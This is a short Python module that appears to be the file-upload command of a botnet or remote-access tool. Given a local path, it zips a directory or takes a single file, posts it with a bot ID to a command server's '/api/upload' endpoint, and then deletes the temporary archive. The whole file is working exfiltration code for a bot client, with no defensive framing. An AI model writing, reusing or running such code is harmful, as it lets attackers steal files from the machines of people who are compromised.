import requests
import os
import shutil

import utils
import settings


def run(path):
    filename = os.path.basename(path)
    if os.path.isdir(path):
        arch_path = shutil.make_archive(filename, 'zip', path)
        requests.post(settings.SERVER_URL + "/api/upload", {'botid': settings.BOT_ID, 'src': os.path.basename(arch_path)}, files={'uploaded': open(arch_path, 'rb')})
        os.remove(arch_path)
    else:
        requests.post(settings.SERVER_URL + "/api/upload", {'botid': settings.BOT_ID, 'src': filename}, files={'uploaded': open(path, 'rb')})


def help():
    help_text = """
Usage: upload path/to/local/file
Uploads a file.

"""
    return help_text
